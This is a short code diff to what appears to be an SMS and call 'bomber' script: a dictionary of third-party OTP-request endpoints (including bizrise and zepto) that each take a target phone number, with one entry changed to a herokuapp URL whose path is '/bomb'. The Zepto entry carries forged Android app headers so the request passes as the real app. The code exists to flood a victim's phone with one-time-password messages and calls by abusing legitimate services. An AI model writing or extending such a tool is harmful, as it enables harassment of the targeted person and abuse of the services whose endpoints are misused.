@@ -21,7 +21,7 @@ apidata = {
 
 "bikry":(f"https://app.bizrise.in/otp/generate?&identifier={target}&start=0&type=MOBILE&communication=true",{},"GET",""),
 
-"kingotp":(f"https://www.tool-box.xyz/call-data.php?number={target}",{},"GET","<"),
+"kingotp":(f"https://ruba-x12.herokuapp.com/bomb?number={target}",{},"GET","<"),
 
 "zepto":("https://api.zepto.co.in/api/v1/user/customer/send-otp-ivr/",'{"mobileNumber":'+f'"{target}"'+'}',{'Host': 'api.zepto.co.in', 'accept': 'application/json', 'access-control-allow-credentials': 'true', 'x-requested-with': 'XMLHttpRequest', 'requestid': '006b9aed-23c6-4640-bb57-66070b258286', 'sessionid': 'undefined', 'appversion': '5.12.1', 'platform': 'android', 'systemversion': '10', 'source': 'PLAY_STORE', 'Content-Type': 'application/json', 'content-length': '29', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.12.12'},"POST","OTP"),
 
